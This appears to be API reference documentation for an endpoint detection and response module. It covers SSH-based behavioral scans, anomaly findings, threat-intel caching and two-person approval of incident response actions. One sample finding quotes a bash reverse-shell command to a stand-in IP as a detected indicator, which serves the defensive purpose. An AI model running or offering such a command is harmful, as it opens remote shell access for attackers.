# M3.1 EDR — API Reference

Base URL: `http://localhost:8002/api/m3`

All endpoints require `Authorization: Bearer <jwt>`. Roles `security_officer` and `system_manager` have full access.

---

## Behavioral Scan

### `POST /edr/behavioral-scan`

Start an SSH-based behavioral scan for an asset. Queues a Celery task; returns immediately.

**Request body**

| Field | Type | Required | Description |
|---|---|---|---|
| `asset_id` | int | ✓ | Asset ID from M1 |
| `ssh_host` | string | ✓ | IP or FQDN |
| `ssh_user` | string | ✓ | SSH username |
| `ssh_password` | string | ✓ | SSH password (or use `ssh_key`) |
| `ssh_key` | string | | PEM private key (alternative to password) |
| `ssh_port` | int | | Default: 22 |

**Response `202 Accepted`**

```json
{
  "task_id": "abc123",
  "status": "queued",
  "message": "Behavioral scan queued for asset 42"
}
```

---

## Behavioral Findings

### `GET /edr/behavioral-findings`

List behavioral anomalies detected by the EDR engine.

**Query parameters**

| Param | Type | Default | Description |
|---|---|---|---|
| `asset_id` | int | — | Filter by asset |
| `severity` | string | — | `INFO`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` |
| `status` | string | `open` | `open`, `investigating`, `resolved`, `false_positive` |
| `page` | int | 1 | Page number |
| `limit` | int | 10 | Max 100 |

**Response `200 OK`**

```json
{
  "items": [
    {
      "id": 1,
      "asset_id": 42,
      "process_name": "bash",
      "anomaly_type": "REVERSE_SHELL",
      "severity": "CRITICAL",
      "confidence_score": 95,
      "detection_method": "behavioral_heuristic",
      "indicators": {
        "cmdline": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
        "pid": 31337,
        "user": "www-data"
      },
      "mitre_attack_tactics": ["TA0011", "TA0008"],
      "yara_hits": 2,
      "status": "open",
      "detected_at": "2026-06-16T10:00:00Z"
    }
  ],
  "total": 1,
  "page": 1,
  "pages": 1
}
```

---

## Threat Intelligence Cache

### `GET /edr/threat-intel/cache`

List cached IOC enrichment results.

**Query parameters**

| Param | Type | Default | Description |
|---|---|---|---|
| `ioc_type` | string | — | `ip`, `domain`, `hash`, `url` |
| `is_malicious` | bool | — | Filter by verdict |
| `page` | int | 1 | |
| `limit` | int | 10 | |

**Response `200 OK`**

```json
{
  "items": [
    {
      "id": 1,
      "ioc_value": "45.77.1.1",
      "ioc_type": "ip",
      "is_malicious": true,
      "confidence_score": 85,
      "vt_positives": 42,
      "vt_total": 70,
      "crowdsec_reputation": "malicious",
      "otx_pulse_count": 3,
      "tags": ["c2", "cobalt-strike"],
      "expires_at": "2026-06-17T10:00:00Z"
    }
  ],
  "total": 1,
  "page": 1,
  "pages": 1
}
```

---

## Response Actions (Incident Response)

### `POST /edr/request-response-action`

Request a new IR action. The requester provides a PIN which is bcrypt-hashed and stored with a new TOTP secret. The response includes a QR code for the approver.

**Request body**

| Field | Type | Required | Description |
|---|---|---|---|
| `asset_id` | int | ✓ | Target asset |
| `action_type` | string | ✓ | `kill_process`, `block_ip`, `quarantine_file`, `disable_user`, `collect_forensics` |
| `target_detail` | string | ✓ | e.g. `PID:1337`, `1.2.3.4`, `/tmp/evil.sh` |
| `requested_by` | string | ✓ | Identity of requester (email/username) |
| `justification` | string | ✓ | Free-text reason |
| `pin` | string | ✓ | Min 8 chars, becomes bcrypt hash in DB |

**Response `201 Created`**

```json
{
  "action_id": 7,
  "status": "pending",
  "totp_secret": "JBSWY3DPEHPK3PXP",
  "qr_code_base64": "iVBORw0KGgo...",
  "message": "Action created. Share the QR code with the approver."
}
```

---

### `POST /edr/approve-action/{action_id}`

Approve a pending action. Requires the TOTP code from the QR code and the same PIN used when requesting.

**Path parameter**: `action_id` — integer ID of the pending action.

**Request body**

| Field | Type | Required | Description |
|---|---|---|---|
| `totp_code` | string | ✓ | 6–8 digit TOTP from authenticator app |
| `pin` | string | ✓ | Same PIN as provided at request time |
| `approved_by` | string | ✓ | Identity of approver |

**Response `200 OK`**

```json
{
  "action_id": 7,
  "status": "approved",
  "auto_executed": false,
  "message": "Action approved. Awaiting manual execution or EDR_AUTO_REMEDIATE=true."
}
```

**Error responses**

| Code | Reason |
|---|---|
| `400` | Action is not in `pending` status |
| `401` | Invalid TOTP or PIN |
| `404` | Action not found |

---

### `GET /edr/response-actions/{action_id}`

Fetch a single IR action with full audit trail.

**Response `200 OK`**

```json
{
  "id": 7,
  "asset_id": 42,
  "action_type": "kill_process",
  "target_detail": "PID:1337",
  "requested_by": "analyst@company.com",
  "approved_by": "ciso@company.com",
  "justification": "Active C2 callback",
  "status": "completed",
  "execution_output": "Process 1337 killed. Exit 0.",
  "created_at": "2026-06-16T10:05:00Z",
  "executed_at": "2026-06-16T10:12:00Z"
}
```

---

## EDR Statistics

### `GET /edr/stats`

Aggregate counters for the EDR dashboard KPIs.

**Response `200 OK`**

```json
{
  "total_anomalies": 148,
  "critical_findings": 12,
  "malicious_ips": 7,
  "pending_approvals": 3,
  "assets_monitored": 22,
  "last_scan_at": "2026-06-16T09:55:00Z"
}
```

---

## Enrich Findings (Celery Task)

### `POST /edr/enrich-findings/{finding_id}`

Trigger threat intel enrichment for a specific finding asynchronously. Normally called automatically by the behavioral scan pipeline.

**Response `202 Accepted`**

```json
{ "task_id": "xyz789", "finding_id": 1, "status": "queued" }
```
